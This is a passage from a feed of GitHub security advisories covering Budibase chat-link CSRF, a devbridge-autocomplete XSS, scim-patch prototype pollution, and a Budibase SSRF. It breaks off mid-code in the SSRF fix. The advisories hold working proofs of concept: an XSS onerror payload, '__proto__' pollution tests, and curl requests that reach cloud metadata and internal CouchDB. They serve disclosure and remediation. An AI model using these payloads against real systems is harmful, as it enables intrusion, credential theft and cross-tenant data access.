<p><strong>High</strong> — CVSS 3.1: AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N = <strong>7.3</strong></p>
<h2 id="affected-product">Affected Product</h2>
<ul>
<li><strong>Product:</strong> Budibase</li>
<li><strong>Version:</strong> 3.37.2 (introduced in this version)</li>
<li><strong>Component:</strong> <code>packages/server/src/api/controllers/ai/chatIdentityLinks.ts</code></li>
<li><strong>Endpoint:</strong> <code>GET /api/chat-links/:instance/:token/handoff</code></li>
</ul>
<h2 id="vulnerability-type">Vulnerability Type</h2>
<ul>
<li>CWE-352: Cross-Site Request Forgery</li>
<li>CWE-284: Improper Access Control</li>
</ul>
<hr>
<h2 id="vulnerability-description">Vulnerability Description</h2>
<p><code>GET /api/chat-links/:instance/:token/handoff</code> is a <strong>public endpoint</strong> (no auth required) that performs a permanent, state-changing operation: it binds an external chat identity (Slack/Discord/MS Teams) to an authenticated Budibase user account, with <strong>no consent UI and no CSRF protection</strong>.</p>
<p>The session token in the URL is created <strong>by the attacker</strong> (from their own <code>/link</code> slash command) and embeds <strong>the attacker's <code>externalUserId</code></strong>. When an authenticated Budibase victim visits the URL, their account is silently and permanently linked to the attacker's Slack/Discord identity. The server responds with <code>"Authentication succeeded."</code> — no indication of what was linked.</p>
<h3 id="route-registration">Route Registration</h3>
<pre><code class="language-typescript">// packages/server/src/api/routes/chat.ts:22
router.get(
  "/api/chat-links/:instance/:token/handoff",
  controller.handoffChatLinkSession   // registered in publicRoutes — zero auth middleware
)
</code></pre>
<h3 id="vulnerable-controller-full-function">Vulnerable Controller (full function)</h3>
<pre><code class="language-typescript">// packages/server/src/api/controllers/ai/chatIdentityLinks.ts:61–110
export async function handoffChatLinkSession(
  ctx: UserCtx&lt;void, string, { instance: string; token: string }&gt;
) {
  const token = resolveToken(ctx.params.token)
  const session = await sdk.ai.chatIdentityLinks.getChatIdentityLinkSession(token)
  if (!session) {
    throw new HTTPError("Link token is invalid or has expired", 400)
  }
  assertSessionMatchesInstance({ workspaceId: session.workspaceId, instance: ctx.params.instance })

  if (!ctx.isAuthenticated) {
    // Unauthenticated: set return URL cookie, redirect to login
    // After login, same URL is visited again → attack completes silently
    utils.setCookie(ctx,
      `/api/chat-links/${ctx.params.instance}/${token}/handoff`,
      "budibase:returnurl",
      { sign: false }  // ← unsigned cookie, but not an open redirect
    )
    ctx.redirect("/builder/auth/login")
    return
  }

  const currentGlobalUserId = getCurrentGlobalUserId(ctx)
  const consumedSession = await sdk.ai.chatIdentityLinks.consumeChatIdentityLinkSession(token)

  // ↓↓↓ THE VULNERABLE WRITE — no consent check, no CSRF token ↓↓↓
  await sdk.ai.chatIdentityLinks.upsertChatIdentityLink({
    provider: consumedSession.provider,
    externalUserId: consumedSession.externalUserId,  // ← ATTACKER's Slack ID
    externalUserName: consumedSession.externalUserName,
    teamId: consumedSession.teamId,
    globalUserId: currentGlobalUserId,   // ← VICTIM's Budibase user ID
    linkedBy: currentGlobalUserId,
  })

  ctx.type = "text/html"
  ctx.body = renderLinkSuccessPage()  // ← "Authentication succeeded." — no disclosure to user
}
</code></pre>
<hr>
<h2 id="proof-of-concept--annotated-http-trace">Proof of Concept — Annotated HTTP Trace</h2>
<h3 id="setup">Setup</h3>
<table>
<thead>
<tr>
<th>Role</th>
<th>Identity</th>
</tr>
</thead>
<tbody><tr>
<td>Attacker</td>
<td>Slack user <code>U_ATTACKER</code> (e.g. <code>UA12345678</code>), Budibase tenant <code>acme</code>, workspace ID <code>ws_abc123</code></td>
</tr>
<tr>
<td>Victim</td>
<td>Budibase admin, session cookie <code>budibase:session=VICTIM_SESSION</code></td>
</tr>
</tbody></table>
<hr>
<h3 id="step-1--attacker-triggers-link-in-slack">Step 1 — Attacker triggers <code>/link</code> in Slack</h3>
<p>Attacker types <code>/link</code> to the Budibase Slack bot. Budibase server creates a Redis session:</p>
<p><strong>Redis key:</strong> <code>chatIdentityLinkSession:tok_xxxxxxxxxxxxxxxx</code></p>
<p><strong>Redis value (exact structure from <code>ChatIdentityLinkSession</code> interface):</strong></p>
<pre><code class="language-json">{
  "token": "tok_xxxxxxxxxxxxxxxx",
  "tenantId": "acme",
  "workspaceId": "ws_abc123",
  "provider": "slack",
  "externalUserId": "UA12345678",
  "externalUserName": "attacker",
  "teamId": "T_ACME_SLACK",
  "createdAt": "2026-05-02T10:00:00.000Z",
  "expiresAt": "2026-05-02T10:10:00.000Z"
}
</code></pre>
<p>Slack DM sent privately to attacker:</p>
<pre><code>Link your Slack account to continue chatting with this agent.
https://budibase.company.com/api/chat-links/ws_abc123/tok_xxxxxxxxxxxxxxxx/handoff
</code></pre>
<p><strong>Key observation:</strong> This URL embeds the attacker's own <code>externalUserId</code> inside the token. The attacker has full control over which identity gets linked.</p>
<hr>
<h3 id="step-2--attacker-forwards-url-to-victim">Step 2 — Attacker forwards URL to victim</h3>
<p>Attacker posts in the company Slack:</p>
<pre><code>@admin please click this to connect your Budibase account for AI agent access:
https://budibase.company.com/api/chat-links/ws_abc123/tok_xxxxxxxxxxxxxxxx/handoff
</code></pre>
<hr>
<h3 id="step-3--victim-clicks-link-authenticated">Step 3 — Victim clicks link (authenticated)</h3>
<p><strong>HTTP Request (victim's browser):</strong></p>
<pre><code class="language-http">GET /api/chat-links/ws_abc123/tok_xxxxxxxxxxxxxxxx/handoff HTTP/1.1
Host: budibase.company.com
Cookie: budibase:session=VICTIM_SESSION
</code></pre>
<p><strong>HTTP Response:</strong></p>
<pre><code class="language-http">HTTP/1.1 200 OK
Content-Type: text/html

&lt;!doctype html&gt;
&lt;html lang="en"&gt;
  &lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;
    &lt;title&gt;Authentication succeeded&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;p&gt;Authentication succeeded.&lt;/p&gt;
    &lt;script&gt;
      if (window.opener &amp;&amp; !window.opener.closed) {
        try { window.opener.focus(); window.close() } catch (error) {}
      }
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>The victim sees "Authentication succeeded." with no mention of Slack, no mention of <code>attacker</code>, no mention of what capabilities were granted.</p>
<p><strong>CouchDB global-db document written immediately after (exact structure from <code>upsertChatIdentityLink</code>):</strong></p>
<pre><code class="language-json">{
  "_id": "chatidentitylink_acme_slack_T_ACME_SLACK_UA12345678",
  "tenantId": "acme",
  "provider": "slack",
  "externalUserId": "UA12345678",
  "globalUserId": "ro_global_us_VICTIM_ADMIN_ID",
  "linkedAt": "2026-05-02T10:00:42.000Z",
  "linkedBy": "ro_global_us_VICTIM_ADMIN_ID",
  "externalUserName": "attacker",
  "teamId": "T_ACME_SLACK",
  "createdAt": "2026-05-02T10:00:42.000Z",
  "updatedAt": "2026-05-02T10:00:42.000Z"
}
</code></pre>
<p>The mapping is now permanent. <code>externalUserId = UA12345678</code> (attacker) → <code>globalUserId = ro_global_us_VICTIM_ADMIN_ID</code> (victim).</p>
<hr>
<h3 id="step-4--attacker-impersonates-victim-via-ai-agent">Step 4 — Attacker impersonates victim via AI agent</h3>
<p>Attacker sends any message to the Budibase Slack bot from their own account (<code>UA12345678</code>).</p>
<p>The chat handler resolves the identity:</p>
<pre><code class="language-typescript">// packages/server/src/api/controllers/webhook/chatHandler.ts:421
const existingLink = await sdk.ai.chatIdentityLinks.getChatIdentityLink({
  provider: AgentChannelProvider.SLACK,
  externalUserId: "UA12345678",     // ← attacker's Slack ID
  teamId: "T_ACME_SLACK",
})
// existingLink.globalUserId = "ro_global_us_VICTIM_ADMIN_ID"

const linkedUser = await getGlobalUser("ro_global_us_VICTIM_ADMIN_ID")
// All agent tool calls now execute with victim admin's permissions
</code></pre>
<p>The attacker can now ask the agent:</p>
<blockquote>
<p>"Show me all rows in the Customers table"
"Trigger the 'Send Invoice' automation for customer ID 42"
"What files are in the knowledge base?"</p>
</blockquote>
<p>Each request runs with the victim admin's identity and permissions. The victim has no indication this is happening.</p>
<hr>
<h3 id="step-3b--variant-victim-not-yet-authenticated">Step 3b — Variant: Victim Not Yet Authenticated</h3>
<p>If the victim is not currently logged in when they click the URL:</p>
<p><strong>HTTP Request:</strong></p>
<pre><code class="language-http">GET /api/chat-links/ws_abc123/tok_xxxxxxxxxxxxxxxx/handoff HTTP/1.1
Host: budibase.company.com
</code></pre>
<p><strong>HTTP Response:</strong></p>
<pre><code class="language-http">HTTP/1.1 302 Found
Location: /builder/auth/login
Set-Cookie: budibase:returnurl=%2Fapi%2Fchat-links%2Fws_abc123%2Ftok_xxxxxxxxxxxxxxxx%2Fhandoff; Path=/
</code></pre>
<p>After the victim logs in, the browser follows the return URL and the attack completes identically to Step 3.</p>
<hr>
<h2 id="impact">Impact</h2>
<table>
<thead>
<tr>
<th>Dimension</th>
<th>Detail</th>
</tr>
</thead>
<tbody><tr>
<td>Confidentiality</td>
<td><strong>High</strong> — attacker reads all table rows, files, and knowledge base data accessible to victim</td>
</tr>
<tr>
<td>Integrity</td>
<td><strong>High</strong> — attacker writes rows and triggers automations (email, external API calls, record creation) as victim</td>
</tr>
<tr>
<td>Availability</td>
<td>None</td>
</tr>
<tr>
<td>Auth required</td>
<td><strong>Low</strong> — attacker only needs a Slack/Discord account in the same workspace as the Budibase bot</td>
</tr>
<tr>
<td>User interaction</td>
<td><strong>Required</strong> — victim clicks one link (trivial social engineering in any enterprise Slack)</td>
</tr>
<tr>
<td>Scope</td>
<td>Unchanged — impact is within the victim's Budibase tenant</td>
</tr>
<tr>
<td>Persistence</td>
<td><strong>Permanent</strong> — the link document persists in CouchDB until explicitly deleted; re-exploitation survives token rotation</td>
</tr>
</tbody></table>
<hr>
<h2 id="why-severity-is-high-not-medium">Why Severity Is High (Not Medium)</h2>
<p>The social engineering bar is near zero in enterprise Slack:</p>
<ul>
<li>The link looks like a legitimate Budibase URL on the company domain</li>
<li>The message pattern ("link your account for AI agent access") matches the product's own UX</li>
<li>A victim who clicks and sees "Authentication succeeded." has no reason to be suspicious</li>
<li>The effect is <strong>permanent and silent</strong> — the victim never learns their account was linked</li>
</ul>
<p>Combined with admin-level access to all application data and automation triggers, this meets the bar for High.</p>
<hr>
<h2 id="remediation">Remediation</h2>
<h3 id="minimum-fix--add-consent-page">Minimum Fix — Add Consent Page</h3>
<p>Convert the handoff to a two-step flow:</p>
<pre><code>GET  /api/chat-links/:instance/:token/handoff
  → Show consent page: "You are linking your Budibase account to
    [externalUserName]'s Slack identity ([provider]).
    This allows them to interact with AI agents as you. [Confirm] [Cancel]"

POST /api/chat-links/:instance/:token/handoff  (with CSRF token)
  → Perform the upsertChatIdentityLink() write
</code></pre>
<p>Moving the write to <code>POST</code> removes it from <code>publicRoutes</code>, making Budibase's existing CSRF middleware apply automatically.</p>
<h3 id="additional-hardening">Additional Hardening</h3>
<ul>
<li>Show the <code>externalUserName</code> and provider on the consent page</li>
<li>Log the event to the audit trail (both identities, timestamp, IP)</li>
<li>Optionally restrict linking to users with explicit permission (not all roles)</li>
</ul>
<hr>
<p>Credits,
Vishal Kumar B
<a href="https://github.com/VishaaLlKumaaRr">https://github.com/VishaaLlKumaaRr</a></p>
<h2 id="references">References</h2>
<ul>
<li><code>packages/server/src/api/routes/chat.ts:22</code> — public route registration</li>
<li><code>packages/server/src/api/controllers/ai/chatIdentityLinks.ts:61–110</code> — full vulnerable controller</li>
<li><code>packages/server/src/sdk/workspace/ai/chatIdentityLinks.ts:135–165</code> — session creation (embeds attacker's externalUserId)</li>
<li><code>packages/server/src/sdk/workspace/ai/chatIdentityLinks.ts:202–247</code> — upsertChatIdentityLink (permanent write)</li>
<li><code>packages/server/src/api/controllers/webhook/chatHandler.ts:421</code> — identity resolution during agent message handling</li>
<li><code>packages/server/src/ai/tools/budibase/automations.ts</code> — automation trigger capability</li>
<li><code>packages/server/src/ai/tools/budibase/rows.ts</code> — row read/write capability</li>
<li><code>packages/types/src/sdk/chatIdentityLinks.ts</code> — session + link type definitions</li>
<li>CWE-352: Cross-Site Request Forgery</li>
<li>CWE-284: Improper Access Control</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Budibase/budibase/security/advisories/GHSA-v7j5-vc4m-723w">https://github.com/Budibase/budibase/security/advisories/GHSA-v7j5-vc4m-723w</a></li>
<li><a href="https://github.com/Budibase/budibase/pull/18793">https://github.com/Budibase/budibase/pull/18793</a></li>
<li><a href="https://github.com/Budibase/budibase/commit/cf66fb45d27402bace312d85616ddd4257f3a5aa">https://github.com/Budibase/budibase/commit/cf66fb45d27402bace312d85616ddd4257f3a5aa</a></li>
<li><a href="https://github.com/advisories/GHSA-v7j5-vc4m-723w">https://github.com/advisories/GHSA-v7j5-vc4m-723w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v7j5-vc4m-723w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-22T23:08:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[devbridge-autocomplete] devbridge-autocomplete has XSS in its default formatters: formatGroup and formatResult fail to escape HTML in untrusted inputs]]></title>
        <id>https://github.com/advisories/GHSA-hvqh-jw65-wcpq</id>
        <link href="https://github.com/advisories/GHSA-hvqh-jw65-wcpq"/>
        <updated>2026-06-22T23:00:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The default <code>formatGroup</code> and <code>formatResult</code> functions in <code>devbridge-autocomplete</code> concatenate values into HTML without escaping, allowing XSS when an attacker controls (or can taint) the suggestion data source.</p>
<h3 id="details">Details</h3>
<p><strong>1. <code>formatGroup</code> — <code>category</code> is interpolated raw.</strong></p>
<p><code>src/format.ts</code>:</p>
<pre><code class="language-ts">function formatGroup(suggestion, category) {
    return '&lt;div class="autocomplete-group"&gt;' + category + '&lt;/div&gt;';
}
</code></pre>
<p>If <code>groupBy</code> is used and the grouping field of any suggestion contains HTML, that HTML is executed.</p>
<p><strong>2. <code>formatResult</code> — early-return branch returns <code>suggestion.value</code> raw.</strong></p>
<p><code>src/format.ts</code>:</p>
<pre><code class="language-ts">function formatResult(suggestion, currentValue) {
    if (!currentValue) {
        return suggestion.value;   // un-escaped
    }
    /* ... non-empty path escapes correctly ... */
}
</code></pre>
<p>The early-return branch is reached when <code>suggest()</code> renders with an empty <code>currentValue</code>, which happens with <code>minChars: 0</code> and a server that returns suggestions for an empty query. The returned string is concatenated into the container's <code>innerHTML</code>.</p>
<h3 id="poc-formatgroup">PoC (formatGroup)</h3>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;meta charset="utf-8"&gt;
    &lt;title&gt;PoC: formatGroup XSS in jQuery-Autocomplete v2.0.0&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;input id="ac" type="text" placeholder="Type 'a' to trigger" autocomplete="off"&gt;

    &lt;script src="https://code.jquery.com/jquery-3.7.1.min.js"&gt;&lt;/script&gt;
    &lt;script src="dist/jquery.autocomplete.js"&gt;&lt;/script&gt;
    &lt;script&gt;
        var poisoned = [
            { value: 'Apple',   data: { category: "&lt;img src=x onerror=\"alert('XSS via formatGroup')\"&gt;" } },
            { value: 'Avocado', data: { category: 'Safe Group' } }
        ];

        $('#ac').devbridgeAutocomplete({
            lookup: poisoned,
            groupBy: 'category',
            minChars: 1
        });
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>Originally identified by an earlier human analysis; the PoC above was produced with the assistance of Claude Opus 4.7.</p>
<h3 id="impact">Impact</h3>
<p>XSS in pages that render attacker-controllable suggestion data. The actual impact depends on what the embedding page has access to (cookies, session tokens, DOM), per standard reflected/stored XSS.</p>
<h3 id="patch">Patch</h3>
<p>Both formatters now run their interpolated input through the browser's text-node escaping (<code>createElement</code> + <code>textContent</code>) before producing the HTML string. Fixed in version <code>2.0.1</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/devbridge/jQuery-Autocomplete/security/advisories/GHSA-hvqh-jw65-wcpq">https://github.com/devbridge/jQuery-Autocomplete/security/advisories/GHSA-hvqh-jw65-wcpq</a></li>
<li><a href="https://github.com/devbridge/jQuery-Autocomplete/commit/63ff096ff5b77a90aac7fb5dad7c86e538a59ce0">https://github.com/devbridge/jQuery-Autocomplete/commit/63ff096ff5b77a90aac7fb5dad7c86e538a59ce0</a></li>
<li><a href="https://github.com/advisories/GHSA-hvqh-jw65-wcpq">https://github.com/advisories/GHSA-hvqh-jw65-wcpq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hvqh-jw65-wcpq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-22T23:00:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scim-patch] scimPatch vulnerable to prototype pollution via unfiltered keys in patch]]></title>
        <id>https://github.com/advisories/GHSA-9m6g-wc8r-q59c</id>
        <link href="https://github.com/advisories/GHSA-9m6g-wc8r-q59c"/>
        <updated>2026-06-22T22:57:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>scim-patch</code> performs prototype pollution when applying a SCIM PATCH operation whose <code>value</code> object contains a key like <code>"__proto__.someProp"</code>. After one such patch,
<code>Object.prototype.someProp</code> is set process-wide, affecting every plain object in the Node process.</p>
<p>Any service that calls <code>scimPatch()</code> on attacker-controlled JSON (i.e. any SCIM endpoint accepting <code>PATCH</code> from an external IdP) is exploitable on a stock Node runtime.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Class:</strong> Prototype pollution (<a href="https://cwe.mitre.org/data/definitions/1321.html">CWE-1321</a>)</li>
<li><strong>Affected versions:</strong> <code>&lt;= 0.9.0</code> (current HEAD <code>871b1e2</code>)</li>
<li><strong>Attack vector:</strong> Network — sent as part of a normal SCIM <code>PATCH /Users/:id</code> request body.</li>
<li><strong>Privileges required:</strong> Whatever the SCIM endpoint requires. For most integrations that's a provisioned IdP, which is "low" in CVSS terms (any authenticated provisioning client).</li>
<li><strong>Scope:</strong> Changed — the bug is in a SCIM library but the side effect (<code>Object.prototype</code> mutation) leaks into the entire Node process.</li>
</ul>
<p>Downstream consequences depend on what other code reads from plain objects. Realistic outcomes observed in similar bugs:</p>
<ul>
<li><strong>Privilege escalation</strong> if any auth/middleware code checks <code>actor.isAdmin</code> / <code>req.user.admin</code> / similar boolean flags against a plain object that <em>expects</em> the key to be absent.</li>
<li><strong>Logic bypass / DoS</strong> if any code branches on <code>obj.name</code>, <code>obj.type</code>, <code>obj.id</code> etc. against plain objects (e.g. <code>pg</code>'s prepared-statement naming check — a real incident at one consumer).</li>
<li><strong>Persistence:</strong> lasts until the Node process restarts, so the blast radius is <em>every</em> request that container handles after the pollution.</li>
</ul>
<h2 id="root-cause">Root cause</h2>
<p>In <code>src/scimPatch.ts:415-427</code>, <code>addOrReplaceObjectAttribute</code> iterates the user-supplied <code>patch.value</code> with <code>Object.entries</code> and feeds each key to <code>resolvePaths</code>, which splits on <code>.</code>:</p>
<pre><code class="language-ts">function addOrReplaceObjectAttribute(property: any, patch: ScimPatchAddReplaceOperation, multiValuedPathFilter?: boolean): any {
    if (typeof patch.value !== 'object') { ... }

    // src/scimPatch.ts:423-427
    for (const [key, value] of Object.entries(patch.value)) {
        assign(property, resolvePaths(key), value, patch.op);
    }
    return property;
}
</code></pre>
<p><code>assign</code> then walks the resulting key path with no filtering on dangerous keys (<code>src/scimPatch.ts:437-445</code>):</p>
<pre><code class="language-ts">function assign(obj: any, keyPath: Array&lt;string&gt;, value: any, op: string) {
    const lastKeyIndex = keyPath.length - 1;
    for (let i = 0; i &lt; lastKeyIndex; ++i) {
        const key = keyPath[i];
        if (!(key in obj)) {
            obj[key] = {};
        }
        obj = obj[key];   // ← obj["__proto__"] === Object.prototype
    }
    // ... assigns into Object.prototype
}
</code></pre>
<p>For <code>keyPath = ["__proto__", "polluted"]</code>:</p>
<ul>
<li><code>"__proto__" in obj</code> is always true, so the fresh-object branch is skipped.</li>
<li><code>obj = obj["__proto__"]</code> now points to <code>Object.prototype</code>.</li>
<li>The final write lands on <code>Object.prototype.polluted</code>.</li>
</ul>
<p>The same shape works for <code>constructor.prototype</code> keys.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>Drop this in <code>test/prototypePollution.test.ts</code> and run <code>npm run build &amp;&amp; npx mocha lib/test/prototypePollution.test.js</code>. Both tests pass against HEAD <code>871b1e2</code>:</p>
<pre><code class="language-ts">import { scimPatch } from '../src/scimPatch';
import { ScimUser } from './types/types.test';
import { expect } from 'chai';

describe('Prototype pollution via scim-patch', () =&gt; {
    let scimUser: ScimUser;

    beforeEach(() =&gt; {
        scimUser = JSON.parse(`{
          "schemas": ["urn:ietf:params:scim:schemas:core:2.0:User"],
          "id": "tea_4",
          "userName": "spiderman",
          "name": { "familyName": "Parker", "givenName": "Peter" },
          "active": true,
          "emails": [{ "value": "spiderman@superheroes.com", "primary": true }],
          "roles": [],
          "meta": { "resourceType": "User", "created": "x", "lastModified": "x", "location": "x" }
        }`);
    });

    afterEach(() =&gt; {
        delete (Object.prototype as any).polluted;
        delete (Object.prototype as any).isAdmin;
    });

    it('pollutes Object.prototype via a value-key containing __proto__', () =&gt; {
        expect(({} as any).polluted).to.equal(undefined);

        scimPatch(scimUser, [{
            op: 'add',
            path: 'name',
            value: { '__proto__.polluted': 'yes' }
        }]);

        expect((Object.prototype as any).polluted).to.equal('yes');
        expect(({} as any).polluted).to.equal('yes');
    });

    it('elevates Object.prototype.isAdmin — the admin-escalation shape', () =&gt; {
        expect(({} as any).isAdmin).to.equal(undefined);

        scimPatch(scimUser, [{
            op: 'add',
            path: 'name',
            value: { '__proto__.isAdmin': true }
        }]);

        expect((Object.prototype as any).isAdmin).to.equal(true);
        expect(({} as any).isAdmin).to.equal(true);
    });
});
</code></pre>
<h2 id="suggested-fix">Suggested fix</h2>
<p>Reject the three dangerous keys in <code>assign()</code> before the walk. Minimal patch:</p>
<pre><code class="language-ts">const DANGEROUS_KEYS = new Set(['__proto__', 'constructor', 'prototype']);

function assign(obj: any, keyPath: Array&lt;string&gt;, value: any, op: string) {
    for (const key of keyPath) {
        if (DANGEROUS_KEYS.has(key)) {
            throw new InvalidScimPatchOp(`Forbidden key in patch path: ${key}`);
        }
    }
    // ... existing logic
}
</code></pre>
<p>Alternative, slightly safer: switch the walk target to <code>Object.create(null)</code> nodes when creating intermediate objects, and use <code>Object.defineProperty(obj, key, { value, enumerable: true, configurable: true, writable: true })</code> instead of <code>obj[key] = value</code> for the final write. That defends against future prototype-walking sinks even if a key sneaks past the denylist.</p>
<p>Either approach is a non-breaking change — legitimate SCIM clients never send these keys.</p>
<h2 id="mitigation-for-consumers-who-cant-upgrade-immediately">Mitigation for consumers who can't upgrade immediately</h2>
<p>Calling <code>Object.freeze(Object.prototype)</code> (and the same on <code>Array.prototype</code>, <code>Function.prototype</code>) at process startup neutralizes this class of bug — assignment to a frozen prototype becomes a silent no-op in sloppy mode or a <code>TypeError</code> in strict mode. Node's <code>--frozen-intrinsics</code> flag does this for built-ins automatically.</p>
<h2 id="credit">Credit</h2>
<p>Discovered by <strong>Lee Wang (Notion)</strong>. Reported by <strong>David Wu (Notion)</strong>.</p>
<p>Report authored by <strong>Claude</strong>. Reviewed by <strong>David Wu</strong>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/thomaspoignant/scim-patch/security/advisories/GHSA-9m6g-wc8r-q59c">https://github.com/thomaspoignant/scim-patch/security/advisories/GHSA-9m6g-wc8r-q59c</a></li>
<li><a href="https://github.com/thomaspoignant/scim-patch/commit/260f9cd2ac5ceac3976978850bb47dcb391720f6">https://github.com/thomaspoignant/scim-patch/commit/260f9cd2ac5ceac3976978850bb47dcb391720f6</a></li>
<li><a href="https://github.com/advisories/GHSA-9m6g-wc8r-q59c">https://github.com/advisories/GHSA-9m6g-wc8r-q59c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9m6g-wc8r-q59c</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-06-22T22:57:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@budibase/server] Budibase: SSRF via OAuth2 token endpoint URL reaches internal hosts and cloud metadata]]></title>
        <id>https://github.com/advisories/GHSA-4q6h-8p4v-67vq</id>
        <link href="https://github.com/advisories/GHSA-4q6h-8p4v-67vq"/>
        <updated>2026-06-22T22:45:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>fetchToken</code> in the OAuth2 SDK makes a POST to a builder-supplied URL with plain node-fetch, skipping the <code>blacklist.isBlacklisted</code> check that every other outbound fetch path in the codebase uses. The Joi schema for the OAuth2 URL has no scheme or host restriction. Alice, a builder, points an OAuth2 config at <code>http://169.254.169.254/...</code> or <code>http://127.0.0.1:5984/</code>; the server connects and returns response-body fragments in the validation result.</p>
<h2 id="details">Details</h2>
<p><code>packages/server/src/sdk/workspace/oauth2/utils.ts:17-65</code> defines <code>fetchToken</code>. Near the end:</p>
<pre><code class="language-typescript">const resp = await fetch(config.url, fetchConfig)
</code></pre>
<p><code>config.url</code> is whatever the builder stored. <code>fetchConfig</code> has <code>redirect: "follow"</code> (the default), so a public URL that returns 302 to an internal target is also reachable.</p>
<p>The route validation at <code>packages/server/src/api/routes/oauth2.ts:9</code> accepts any string:</p>
<pre><code class="language-typescript">url: Joi.string().required(),
</code></pre>
<p>The controller passes the URL into <code>fetchToken</code> through <code>crud.ts</code>. The <code>/api/oauth2/validate</code> endpoint (builder role) is the most direct attack path: it lives on <code>builderRoutes</code>, takes the URL from the body, fires the fetch, and returns a validation envelope that includes the upstream error string.</p>
<p>Compare with every other outbound fetch in the codebase:</p>
<ul>
<li><code>packages/server/src/integrations/rest.ts:754</code> calls <code>blacklist.isBlacklisted(url)</code> before its fetch (though it does not re-check redirects; see companion advisory for REST-redirect SSRF).</li>
<li><code>packages/backend-core/src/utils/outboundFetch.ts:98-100</code> sets <code>redirect: "manual"</code> and re-validates each hop.</li>
<li><code>packages/server/src/automations/steps/outgoingWebhook.ts</code> routes through <code>fetchWithBlacklist</code>.</li>
</ul>
<p>The default blacklist blocks <code>127.0.0.0/8</code>, <code>169.254.0.0/16</code>, <code>10.0.0.0/8</code>, <code>172.16.0.0/12</code>, <code>192.168.0.0/16</code> (<code>packages/backend-core/src/blacklist/blacklist.ts:6-16</code>). The OAuth2 path never consults it.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>Tested against Budibase 3.35.8 (built from master at f960e361).</p>
<p>Step 1: Alice, a builder, POSTs an OAuth2 config pointed at CouchDB on the same host as Budibase:</p>
<pre><code class="language-bash">curl -sS -b "$BUILDER_COOKIE" -X POST "$BASE/api/oauth2/validate" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:5984/","clientId":"t","clientSecret":"t",
       "method":"BODY","grantType":"client_credentials"}'
</code></pre>
<p>Server response:</p>
<pre><code class="language-json">{"valid":false,"message":"Method Not Allowed"}
</code></pre>
<p>Budibase reached CouchDB (which rejects POST at <code>/</code> with 405). Without the blacklist bypass this request would be blocked at the IP check.</p>
<p>Step 2: Probe the cloud metadata range:</p>
<pre><code class="language-bash">curl -sS -b "$BUILDER_COOKIE" -X POST "$BASE/api/oauth2/validate" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/","clientId":"t","clientSecret":"t","method":"BODY","grantType":"client_credentials"}'
</code></pre>
<p>Server response:</p>
<pre><code class="language-json">{"valid":false,"message":"invalid json response body at http://169.254.169.254/latest/meta-data/ reason: Unexpected token 'N', \"Not Found\" is not valid JSON"}
</code></pre>
<p>The <code>"Not Found"</code> substring is the upstream body; the server reached the link-local metadata endpoint and leaked the first bytes of the response into the validation error.</p>
<h2 id="impact">Impact</h2>
<p>Two concrete paths, both reachable from any builder account (free-tier signup on Budibase Cloud is enough):</p>
<ol>
<li><strong>Cross-tenant data read on Cloud.</strong> Budibase Cloud multi-tenants on a shared CouchDB; each tenant gets its own <code>&lt;tenantId&gt;_global-db</code> and <code>app_&lt;id&gt;</code> databases on the same port 5984. The blacklist is what keeps a builder from talking to CouchDB directly. With that bypassed, Alice can <code>GET http://127.0.0.1:5984/_all_dbs</code> via a 302 redirector and enumerate every other tenant's databases, then read their <code>_users</code>, app definitions, and datasource configs (which include third-party credentials). None of this traffic goes through Budibase's tenant isolation layer, so standard app-level access controls do not apply.</li>
<li><strong>IAM credential exfiltration.</strong> Alice points the URL at <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;/</code> and receives the instance role credentials in the validation error path. Those credentials carry whatever AWS permissions the Budibase instance role holds.</li>
</ol>
<p>Self-hosted deployments face the same CouchDB/Redis/MinIO access plus any other service reachable on the host or pod network. The blacklist was explicitly added to prevent exactly this, and every other outbound fetch path uses it.</p>
<h2 id="recommended-fix">Recommended Fix</h2>
<p>Call <code>blacklist.isBlacklisted</code> before the fetch and set <code>redirect: "manual"</code> on <code>fetchConfig</code>, matching the pattern in <code>outboundFetch.ts</code>:</p>
<pre><code class="language-typescript">import { blacklist } from "@budibase/backend-core"

async function fetchToken(config: { url: string; /* ... */ }) {
  config = await processEnvironmentVariable(config)
  if (await blacklist.isBlacklisted(config.url)) {
    throw new Error("OAuth2 token URL is blocked.")
  }
  const fetchConfig: RequestInit = {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
